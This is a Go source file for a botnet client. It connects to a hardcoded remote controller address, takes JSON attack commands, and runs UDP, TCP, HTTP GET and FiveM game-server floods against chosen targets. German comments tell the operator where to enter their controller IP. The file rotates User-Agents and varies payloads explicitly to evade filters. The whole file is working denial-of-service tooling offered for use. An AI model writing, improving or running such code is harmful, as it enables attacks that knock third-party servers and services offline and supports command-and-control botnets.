package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"sync"
	"time"
)

// Command structure to receive from controller
type AttackCommand struct {
	Method     string `json:"method"`
	TargetIP   string `json:"target_ip"`
	TargetPort int    `json:"target_port"`
	Threads    int    `json:"threads"`
	Duration   int    `json:"duration"`
}

// UdpFlood implements the UDP flood attack with randomized payloads
func UdpFlood(IP, PORT string, SECONDS int, SIZE int, THREADS int) {
	var wg sync.WaitGroup
	fmt.Printf("[%s] UDP Attack started: %s:%s for %ds (Randomized Payloads)\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS)
	stop := make(chan struct{})
	addr := net.JoinHostPort(IP, PORT)

	if THREADS <= 0 {
		THREADS = 500
	}

	for i := 0; i < THREADS; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, _ := net.Dial("udp", addr)
			if conn == nil {
				return
			}
			defer conn.Close()

			payload := make([]byte, SIZE)
			for {
				select {
				case <-stop:
					return
				default:
					rand.Read(payload) // Randomize payload for each packet
					conn.Write(payload)
				}
			}
		}()
	}

	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() { close(stop) })
	wg.Wait()
	fmt.Println("UDP Attack finished.")
}

// TcpFlood implements the TCP flood attack
func TcpFlood(IP, PORT string, SECONDS int, THREADS int) {
	var wg sync.WaitGroup
	fmt.Printf("[%s] TCP Attack started: %s:%s for %ds\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS)
	stop := make(chan struct{})
	addr := net.JoinHostPort(IP, PORT)

	if THREADS <= 0 {
		THREADS = 500
	}

	for i := 0; i < THREADS; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-stop:
					return
				default:
					conn, err := net.DialTimeout("tcp", addr, 1*time.Second)
					if err == nil {
						conn.Close()
					}
				}
			}
		}()
	}

	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() { close(stop) })
	wg.Wait()
	fmt.Println("TCP Attack finished.")
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
}

// HttpFlood implements a Layer 7 HTTP GET flood with rotated User-Agents
func HttpFlood(IP, PORT string, SECONDS int, THREADS int) {
	var wg sync.WaitGroup
	fmt.Printf("[%s] HTTP Attack started: %s:%s for %ds (UA Rotation)\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS)
	stop := make(chan struct{})
	addr := net.JoinHostPort(IP, PORT)

	if THREADS <= 0 {
		THREADS = 200
	}

	for i := 0; i < THREADS; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-stop:
					return
				default:
					conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
					if err == nil {
						ua := userAgents[rand.Intn(len(userAgents))]
						payload := []byte(fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n", IP, ua))
						conn.Write(payload)
						conn.Close()
					}
				}
			}
		}()
	}

	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() { close(stop) })
	wg.Wait()
	fmt.Println("HTTP Attack finished.")
}

// FiveMFlood implements specialized UDP flood for FiveM servers
func FiveMFlood(IP, PORT string, SECONDS int, THREADS int) {
	var wg sync.WaitGroup
	fmt.Printf("[%s] FiveM Attack started: %s:%s for %ds\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS)
	stop := make(chan struct{})
	addr := net.JoinHostPort(IP, PORT)

	// Vary the query types to bypass simple filters
	payloads := [][]byte{
		[]byte("\xff\xff\xff\xffgetinfo xxx"),
		[]byte("\xff\xff\xff\xffgetstatus xxx"),
		[]byte("\xff\xff\xff\xffgetplayers xxx"),
	}

	if THREADS <= 0 {
		THREADS = 500
	}

	for i := 0; i < THREADS; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, _ := net.Dial("udp", addr)
			if conn == nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-stop:
					return
				default:
					payload := payloads[rand.Intn(len(payloads))]
					conn.Write(payload)
				}
			}
		}()
	}

	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() { close(stop) })
	wg.Wait()
	fmt.Println("FiveM Attack finished.")
}

func main() {
	// HIER DEINE CONTROLLER-IP EINTRAGEN
	controllerAddr := "89.36.35.109:9999"

	for {
		fmt.Printf("Verbinde zu Controller %s ...\n", controllerAddr)
		conn, err := net.Dial("tcp", controllerAddr)
		if err != nil {
			fmt.Printf("Verbindung fehlgeschlagen, versuche es in 5 Sekunden erneut...\n")
			time.Sleep(5 * time.Second)
			continue
		}

		fmt.Println("Verbunden! Warte auf Befehle...")
		decoder := json.NewDecoder(conn)

		for {
			var cmd AttackCommand
			if err := decoder.Decode(&cmd); err != nil {
				fmt.Printf("Verbindung verloren oder Fehler: %v\n", err)
				conn.Close()
				break
			}

			fmt.Printf("Befehl empfangen: %s auf %s:%d (Threads: %d, Dauer: %d)\n",
				cmd.Method, cmd.TargetIP, cmd.TargetPort, cmd.Threads, cmd.Duration)

			switch cmd.Method {
			case "UDP":
				go UdpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, 1472, cmd.Threads)
			case "TCP":
				go TcpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, cmd.Threads)
			case "HTTP":
				go HttpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, cmd.Threads)
			case "FIVEM":
				go FiveMFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, cmd.Threads)
			default:
				fmt.Printf("Unbekannte Methode: %s\n", cmd.Method)
			}
		}
	}
}
